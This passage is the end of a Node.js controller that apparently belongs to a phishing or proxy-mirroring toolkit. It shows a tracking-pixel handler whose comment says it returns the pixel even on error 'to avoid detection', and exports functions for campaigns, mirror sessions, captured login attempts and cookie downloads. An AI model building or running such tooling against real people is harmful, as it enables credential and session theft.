      'Cache-Control': 'no-cache, no-store, must-revalidate',
      'Pragma': 'no-cache',
      'Expires': '0'
    });
    res.end(pixel);
  } catch (err) {
    console.error('Error handling proxy monitor:', err.message);
    // Still return pixel to avoid detection
    const pixel = Buffer.from(
      'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==',
      'base64'
    );
    res.writeHead(200, {
      'Content-Type': 'image/png',
      'Content-Length': pixel.length
    });
    res.end(pixel);
  }
};

module.exports = {
  saveCampaign,
  getCampaigns,
  deleteCampaign,
  launchCampaign,
  closeCampaign,
  getCampaignLogs,
  getFormSubmissions,
  getMirrorSession,
  stopMirrorSession,
  trackMirrorView,
  getLoginAttempts,
  downloadCookies,
  handleProxyMonitor
};